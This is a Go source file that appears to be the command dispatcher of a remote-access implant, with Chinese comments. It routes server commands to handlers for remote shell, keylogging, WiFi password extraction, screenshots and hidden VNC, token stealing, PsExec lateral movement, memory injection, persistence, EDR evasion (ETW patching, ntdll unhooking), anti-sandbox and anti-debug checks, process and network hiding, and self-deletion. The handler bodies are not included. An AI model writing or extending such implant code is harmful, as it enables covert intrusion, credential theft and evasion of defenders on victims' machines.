package app

import (
	"encoding/binary"
	"errors"
	"fmt"
	"implant/core/communication"
	"implant/core/debuglog"
	"implant/core/config"
	"implant/core/services"
	"os"
	"sync"
	"time"
)

// 命令频率控制状态（交互式终端命令跳过节流）
var (
	lastCommandTime  = time.Time{}
	commandTimeMutex sync.Mutex
)

// HandleCommand 处理一条已解密的命令数据（cmdType(4) | cmdBuf），
// 执行命令并经 communication 回送结果。传输层（Transport.Recv）负责分帧与解密，
// 本函数不感知具体协议。
func HandleCommand(data []byte) {
	// K2: 命令分发入口 panic 防护——畸形/被篡改载荷导致的 slice 越界等
	// 不得崩溃整个植入体（原无 recover，短包即可进程崩溃失联）
	defer func() {
		if r := recover(); r != nil {
			debuglog.Printf("❌ [APP-RECOVER] 命令处理 panic 已捕获: %v\n", r)
		}
	}()

	if len(data) < 4 {
		debuglog.Printf("⚠️ [APP] 数据长度不足: %d字节\n", len(data))
		return
	}

	cmdType := binary.BigEndian.Uint32(data[:4])
	cmdBuf := data[4:]

	// 心跳 ack（type=3 空载荷）：仅存活探测，非命令，静默忽略。
	// 部分传输层（single/新版 adapter）已在 Recv 丢弃，此处兜底兼容旧路径。
	if cmdType == 3 && len(cmdBuf) == 0 {
		return
	}

	// B5 批量命令包装：count(4) + N×[len(4)|cmd]。逐条派发（递归走完整
	// HandleCommand 链路含节流语义——批量内多条只计一次节流等待,由下方
	// 单条命令统一节流,此处不重复 sleep）。帧畸形时丢弃剩余并告警,不崩溃。
	if cmdType == services.CMD_BATCH {
		if len(cmdBuf) < 4 {
			debuglog.Printf("⚠️ [APP-BATCH] 批量帧头不足: %d字节\n", len(cmdBuf))
			return
		}
		count := int(binary.BigEndian.Uint32(cmdBuf[:4]))
		if count > 64 { // 防御:服务端上限 16,超限视为畸形帧丢弃
			debuglog.Printf("⚠️ [APP-BATCH] 批量条数异常: %d\n", count)
			return
		}
		off := 4
		for i := 0; i < count && off+4 <= len(cmdBuf); i++ {
			l := int(binary.BigEndian.Uint32(cmdBuf[off : off+4]))
			off += 4
			if l <= 0 || off+l > len(cmdBuf) {
				debuglog.Printf("⚠️ [APP-BATCH] 第%d条长度越界(l=%d),丢弃剩余\n", i, l)
				return
			}
			HandleCommand(cmdBuf[off : off+l])
			off += l
		}
		return
	}

	debuglog.Printf("📝 [命令调试] 接收到命令类型: %d, 数据长度: %d\n", cmdType, len(cmdBuf))
	if len(cmdBuf) > 0 {
		debuglog.Printf("📝 [命令数据] 数据内容: %s\n", string(cmdBuf))
	}

	// 智能命令频率控制（交互式终端命令需要实时响应，跳过节流）
	if cmdType != services.INTERACTIVE_SHELL_START &&
		cmdType != services.INTERACTIVE_SHELL_INPUT &&
		cmdType != services.INTERACTIVE_SHELL_STOP &&
		cmdType != services.HVNC_START &&
		cmdType != services.HVNC_STOP &&
		cmdType != services.HVNC_INPUT &&
		cmdType != services.UploadStart &&
		cmdType != services.UploadLoop &&
		cmdType != services.INJECT_MEM {
		commandTimeMutex.Lock()
		if !lastCommandTime.IsZero() && config.WaitTime > 0 {
			elapsedTime := time.Since(lastCommandTime)
			if elapsedTime < config.WaitTime {
				remainingWait := config.WaitTime - elapsedTime
				commandTimeMutex.Unlock()
				debuglog.Printf("⏳ [休眠控制] 命令执行太频繁，等待 %v。。。\n", remainingWait)
				time.Sleep(remainingWait)
				commandTimeMutex.Lock()
			}
		}
		lastCommandTime = time.Now()
		commandTimeMutex.Unlock()
	}

	// 屏幕相关命令额外休眠
	if cmdType == services.SCREENSHOT1 || cmdType == services.GET_MONITOR_FRAME {
		if config.WaitTime > 0 {
			time.Sleep(config.WaitTime)
		}
	}

	var err error
	var callbackType int
	var result []byte

	switch cmdType {
	case services.SHELL: // shell
		result, err = services.CmdShell(cmdBuf)
		callbackType = 0
	case services.UploadStart: //upload 第一次
		result, err = services.CmdUpload(cmdBuf, true)
		callbackType = -1 // ACK 由 CmdUpload 内联回传
	case services.UploadLoop: //upload 后续的upload
		result, err = services.CmdUpload(cmdBuf, false)
		callbackType = -1 // ACK 由 CmdUpload 内联回传
	case services.DOWNLOAD: //download
		result, err = services.CmdDownload(cmdBuf)
		callbackType = 0
	case services.FileBrowse: //File Browser
		result, err = services.CmdFileBrowse(cmdBuf)
		callbackType = services.FileBrowse
	case services.CD: //cd
		result, err = services.CmdCd(cmdBuf)
		callbackType = 0
	case services.SLEEP: //sleep
		result, err = services.CmdSleep(cmdBuf)
		if err == nil && result != nil {
			debuglog.Printf("🔄 [APP] 休眠间隔动态调整完成: %v\n", config.WaitTime)
		}
		callbackType = 0
	case services.PAUSE: //pause
		result, err = services.CmdPause(cmdBuf)
		callbackType = 0
	case services.PWD: //pwd
		result, err = services.CmdPwd()
		callbackType = 0
	case services.EXIT: //exit
		result, err = services.CmdExit()
		if err == nil {
			os.Exit(1)
		}
		callbackType = 0
	case services.EXECUTE: // windows 后台执行程序
		result, err = services.CmdExecute(cmdBuf)
		callbackType = 0
	case services.PS: // ps 列出进程
		result, err = services.CmdPs()
		callbackType = services.PS
	case services.KILL: //kill
		result, err = services.CmdKill(cmdBuf)
		callbackType = 0
	case services.MKDIR: //mkdir
		result, err = services.CmdMkdir(cmdBuf)
		callbackType = 0
	case services.DRIVES: //list drives
		result, err = services.CmdDrives()
		callbackType = services.DRIVES
	case services.RM: //rm
		result, err = services.CmdRm(cmdBuf)
		callbackType = 0
	case services.CP: //cp
		result, err = services.CmdCp(cmdBuf)
		callbackType = 0
	case services.MV: //mv
		result, err = services.CmdMv(cmdBuf)
		callbackType = services.FILE_OP_RESULT
	case services.FILESAVE:
		result, err = services.CmdFileSave(cmdBuf)
		callbackType = services.FILE_OP_RESULT
	case services.MODIFYTIME:
		result, err = services.CmdModifyTime(cmdBuf)
		callbackType = services.FILE_OP_RESULT
	case services.HIDEFILE:
		result, err = services.CmdHideFile(cmdBuf)
		callbackType = services.FILE_OP_RESULT
	case services.UNHIDEFILE:
		result, err = services.CmdUnhideFile(cmdBuf)
		callbackType = services.FILE_OP_RESULT
	case services.ExecuteLinuxScript:
		result, err = services.CmdExecuteLinuxScript(cmdBuf)
		callbackType = 0
	case services.ExecuteLinuxBin:
		result, err = services.CmdExecuteLinuxBin(cmdBuf)
		callbackType = 0
	case services.ExecuteBof:
		result, err = services.CmdExecuteBof(cmdBuf)
		callbackType = 0
	case services.ExecuteFile:
		result, err = services.CmdExecuteFile(cmdBuf)
		callbackType = 0
	case services.SCREENSHOT1:
		debuglog.Printf("📷 收到SCREENSHOT1命令 [%d]\n", services.SCREENSHOT1)
		result, err = services.CmdScreenshot(cmdBuf)
		// 【修复】回复类型用 SCREENSHOT1 而非 0：服务端直接按类型路由，
		// 不再依赖"输出恰好像图片"的启发式识别
		callbackType = services.SCREENSHOT1
	case services.START_MONITOR:
		debuglog.Printf("📺 收到START_MONITOR命令 [%d]\n", services.START_MONITOR)
		result, err = services.CmdStartMonitor(cmdBuf)
		callbackType = 0
	case services.STOP_MONITOR:
		debuglog.Printf("⏹️ 收到STOP_MONITOR命令 [%d]\n", services.STOP_MONITOR)
		result, err = services.CmdStopMonitor(cmdBuf)
		callbackType = 0
	case services.GET_MONITOR_FRAME:
		debuglog.Printf("📺 收到GET_MONITOR_FRAME命令 [%d]\n", services.GET_MONITOR_FRAME)
		result, err = services.CmdGetMonitorFrame(cmdBuf)
		callbackType = services.MONITOR_FRAME
	case services.HVNC_START:
		debuglog.Printf("🖥️ [HVNC] 收到HVNC_START命令 [%d]\n", services.HVNC_START)
		result, err = services.CmdHvncStart(cmdBuf)
		callbackType = 0
	case services.HVNC_STOP:
		debuglog.Printf("🖥️ [HVNC] 收到HVNC_STOP命令 [%d]\n", services.HVNC_STOP)
		result, err = services.CmdHvncStop(cmdBuf)
		callbackType = 0
	case services.HVNC_INPUT:
		debuglog.Printf("🖥️ [HVNC] 收到HVNC_INPUT命令 [%d]\n", services.HVNC_INPUT)
		result, err = services.CmdHvncInput(cmdBuf)
		callbackType = 0
	case services.ReverseSocks5Start:
		debuglog.Printf("🔄 [反向SOCKS5] 收到ReverseSocks5Start命令 [%d]\n", services.ReverseSocks5Start)
		result, err = services.CmdReverseSocks5Connect(cmdBuf)
		callbackType = 0
	case services.ReverseSocks5Close:
		debuglog.Printf("🛑 [反向SOCKS5] 收到ReverseSocks5Close命令 [%d]\n", services.ReverseSocks5Close)
		// 真正关闭隧道会话（关闭 mux 会话使 agent 退出），而非仅返回回执
		result, err = services.CmdReverseSocks5Close()
		callbackType = 0
	case services.ExecuteAssembly:
		debuglog.Printf("🚀 [Windows内存执行] 收到ExecuteAssembly命令 [%d]\n", services.ExecuteAssembly)
		result, err = services.CmdExecuteAssembly(cmdBuf)
		callbackType = 0
	case services.InlineBin:
		debuglog.Printf("🚀 [Windows内存执行] 收到InlineBin命令 [%d]\n", services.InlineBin)
		result, err = services.CmdInlineBin(cmdBuf)
		callbackType = 0
	case services.FILE_EDIT_READ:
		debuglog.Printf("📖 [文件编辑] 收到FILE_EDIT_READ命令 [%d]\n", services.FILE_EDIT_READ)
		result, err = services.CmdFileEditRead(cmdBuf)
		callbackType = services.FILE_EDIT_READ
	case services.FILE_EDIT_WRITE:
		debuglog.Printf("💾 [文件编辑] 收到FILE_EDIT_WRITE命令 [%d]\n", services.FILE_EDIT_WRITE)
		result, err = services.CmdFileEditWrite(cmdBuf)
		callbackType = services.FILE_EDIT_WRITE
	case services.INTERACTIVE_SHELL_START:
		debuglog.Printf("🐧 [交互式Shell] 收到INTERACTIVE_SHELL_START命令 [%d]\n", services.INTERACTIVE_SHELL_START)
		result, err = services.CmdInteractiveShellStart(cmdBuf)
		callbackType = 0
	case services.INTERACTIVE_SHELL_STOP:
		debuglog.Printf("🛑 [交互式Shell] 收到INTERACTIVE_SHELL_STOP命令 [%d]\n", services.INTERACTIVE_SHELL_STOP)
		result, err = services.CmdInteractiveShellStop(cmdBuf)
		// 【安全修复】不再回落双引擎：XTerm 输入/停止只允许作用于 ConPTY 会话，
		// 回落会把控制字节当命令经 CMD/WMI 引擎执行（垃圾命令落盘）
		callbackType = 0
	case services.INTERACTIVE_SHELL_INPUT:
		debuglog.Printf("⌨️ [交互式Shell] 收到INTERACTIVE_SHELL_INPUT命令 [%d]\n", services.INTERACTIVE_SHELL_INPUT)
		result, err = services.CmdInteractiveShellInput(cmdBuf)
		callbackType = 0
	case services.CMD_MODE_START:
		debuglog.Printf("💼 [Windows CMD模式] 收到CMD_MODE_START命令 [%d]\n", services.CMD_MODE_START)
		result, err = services.CmdModeStart(cmdBuf)
		callbackType = 0
	case services.CMD_MODE_INPUT:
		debuglog.Printf("⌨️ [Windows CMD模式] 收到CMD_MODE_INPUT命令 [%d]\n", services.CMD_MODE_INPUT)
		result, err = services.CmdModeInput(cmdBuf)
		callbackType = 0
	case services.CMD_MODE_STOP:
		debuglog.Printf("🛑 [Windows CMD模式] 收到CMD_MODE_STOP命令 [%d]\n", services.CMD_MODE_STOP)
		result, err = services.CmdModeStop(cmdBuf)
		callbackType = 0
	case services.WMI_MODE_START:
		debuglog.Printf("🕵️ [Windows WMI模式] 收到WMI_MODE_START命令 [%d]\n", services.WMI_MODE_START)
		result, err = services.WmiModeStart(cmdBuf)
		callbackType = 0
	case services.WMI_MODE_INPUT:
		debuglog.Printf("✨ [Windows WMI模式] 收到WMI_MODE_INPUT命令 [%d]\n", services.WMI_MODE_INPUT)
		result, err = services.WmiModeInput(cmdBuf)
		callbackType = 0
	case services.WMI_MODE_STOP:
		debuglog.Printf("🛑 [Windows WMI模式] 收到WMI_MODE_STOP命令 [%d]\n", services.WMI_MODE_STOP)
		result, err = services.WmiModeStop(cmdBuf)
		callbackType = 0
	case services.HTTP_TUNNEL:
		debuglog.Printf("🌐 [隧道代理] 收到HTTP_TUNNEL命令 [%d]\n", services.HTTP_TUNNEL)
		result, err = services.CmdHTTPTunnel(cmdBuf)
		callbackType = 0
	case services.PERSIST:
		debuglog.Printf("💾 [持久化] 收到PERSIST命令 [%d]\n", services.PERSIST)
		result, err = services.CmdPersist(cmdBuf)
		callbackType = 0
	case services.CLIPBOARD:
		debuglog.Printf("📋 [工具箱] 读取剪贴板 [%d]\n", services.CLIPBOARD)
		result, err = services.CmdClipboard(cmdBuf)
		callbackType = 0
	case services.WIFI:
		debuglog.Printf("📶 [工具箱] 提取WiFi密码 [%d]\n", services.WIFI)
		result, err = services.CmdWifi(cmdBuf)
		callbackType = 0
	case services.SELFDELETE:
		debuglog.Printf("🗑️ [工具箱] 自删除 [%d]\n", services.SELFDELETE)
		result, err = services.CmdSelfDelete(cmdBuf)
		callbackType = 0
	case services.SELFDELETE_EXIT:
		debuglog.Printf("🗑️ [工具箱] 自删除并退出 [%d]\n", services.SELFDELETE_EXIT)
		result, err = services.CmdSelfDeleteExit(cmdBuf)
		callbackType = 0
	case services.HIDE_PROCESS:
		debuglog.Printf("🕵️ [工具箱] 进程名隐藏 [%d]\n", services.HIDE_PROCESS)
		result, err = services.CmdHideProcess(cmdBuf)
		callbackType = 0
	case services.HIDE_NET:
		debuglog.Printf("🕵️ [工具箱] 网络连接隐藏 [%d]\n", services.HIDE_NET)
		result, err = services.CmdHideNet(cmdBuf)
		callbackType = 0
	case services.KEYLOG_START:
		debuglog.Printf("⌨️ [工具箱] 启动键盘记录 [%d]\n", services.KEYLOG_START)
		result, err = services.CmdKeylogStart(cmdBuf)
		callbackType = 0
	case services.KEYLOG_GET:
		debuglog.Printf("⌨️ [工具箱] 获取键盘记录 [%d]\n", services.KEYLOG_GET)
		result, err = services.CmdKeylogGet(cmdBuf)
		callbackType = 0
	case services.KEYLOG_STOP:
		debuglog.Printf("⌨️ [工具箱] 停止键盘记录 [%d]\n", services.KEYLOG_STOP)
		result, err = services.CmdKeylogStop(cmdBuf)
		callbackType = 0
	case services.SERVICES:
		debuglog.Printf("🛠️ [工具箱] 列出服务 [%d]\n", services.SERVICES)
		result, err = services.CmdServicesList(cmdBuf)
		callbackType = 0
	case services.SERVICE_START:
		debuglog.Printf("🛠️ [工具箱] 启动服务 [%d]\n", services.SERVICE_START)
		result, err = services.CmdServiceStart(cmdBuf)
		callbackType = 0
	case services.SERVICE_STOP:
		debuglog.Printf("🛠️ [工具箱] 停止服务 [%d]\n", services.SERVICE_STOP)
		result, err = services.CmdServiceStop(cmdBuf)
		callbackType = 0
	case services.REG_QUERY:
		debuglog.Printf("🗄️ [工具箱] 注册表查询 [%d]\n", services.REG_QUERY)
		result, err = services.CmdRegQuery(cmdBuf)
		callbackType = 0
	case services.ETW_PATCH:
		debuglog.Printf("🛡️ [EDR规避] 收到ETW_PATCH命令 [%d]\n", services.ETW_PATCH)
		result, err = services.CmdEtwPatch()
		callbackType = 0
	case services.UNHOOK_NTDLL:
		debuglog.Printf("🛡️ [EDR规避] 收到UNHOOK_NTDLL命令 [%d]\n", services.UNHOOK_NTDLL)
		result, err = services.CmdUnhookNtdll()
		callbackType = 0
	case services.SANDBOX_CHECK:
		debuglog.Printf("🏜️ [反分析] 收到SANDBOX_CHECK命令 [%d]\n", services.SANDBOX_CHECK)
		result, err = services.CmdSandboxCheck()
		callbackType = 0
	case services.ANTIDEBUG:
		debuglog.Printf("🛡️ [反分析] 收到ANTIDEBUG命令 [%d]\n", services.ANTIDEBUG)
		result, err = services.CmdAntidebug()
		callbackType = 0
	case services.SELF_UPDATE:
		debuglog.Printf("🔄 [自我更新] 收到SELF_UPDATE命令 [%d]\n", services.SELF_UPDATE)
		result, err = services.CmdSelfUpdate(cmdBuf)
		callbackType = 0
	case services.AD_ENUM:
		debuglog.Printf("🌐 [域信息] 收到AD_ENUM命令 [%d]\n", services.AD_ENUM)
		result, err = services.CmdAdEnum(cmdBuf)
		callbackType = 0
	case services.PSEXEC:
		debuglog.Printf("🎯 [横向移动] 收到PSEXEC命令 [%d]\n", services.PSEXEC)
		result, err = services.CmdPsexec(cmdBuf)
		callbackType = 0
	case services.MAKE_TOKEN:
		debuglog.Printf("🔑 [Token] 收到MAKE_TOKEN命令 [%d]\n", services.MAKE_TOKEN)
		result, err = services.CmdMakeToken(cmdBuf)
		callbackType = 0
	case services.STEAL_TOKEN:
		debuglog.Printf("🔑 [Token] 收到STEAL_TOKEN命令 [%d]\n", services.STEAL_TOKEN)
		result, err = services.CmdStealToken(cmdBuf)
		callbackType = 0
	case services.REV2SELF:
		debuglog.Printf("🔑 [Token] 收到REV2SELF命令 [%d]\n", services.REV2SELF)
		result, err = services.CmdRev2Self(cmdBuf)
		callbackType = 0
	case services.INJECT_MEM:
		debuglog.Printf("💉 [内存注入] 收到INJECT_MEM命令 [%d]\n", services.INJECT_MEM)
		result, err = services.CmdInjectMem(cmdBuf)
		callbackType = 0
	case services.WMI_PERSIST:
		// K4: 移除误执行的 UNHOOK_NTDLL 分支（复制粘贴遗漏：
		// 原实现 WMI 持久化结果被覆盖并意外触发 unhook 副作用）
		debuglog.Printf("🧿 [持久化] 收到WMI_PERSIST命令 [%d]\n", services.WMI_PERSIST)
		result, err = services.CmdWmiPersist(cmdBuf)
		callbackType = 0
	default:
		debuglog.Printf("❌ [命令错误] 不支持的命令类型: %d\n", cmdType)
		err = errors.New(fmt.Sprintf("not supported command: %d", cmdType))
	}

	if err != nil {
		communication.ErrorProcess(err)
	} else if callbackType >= 0 {
		communication.DataProcess(callbackType, result)
	}
}
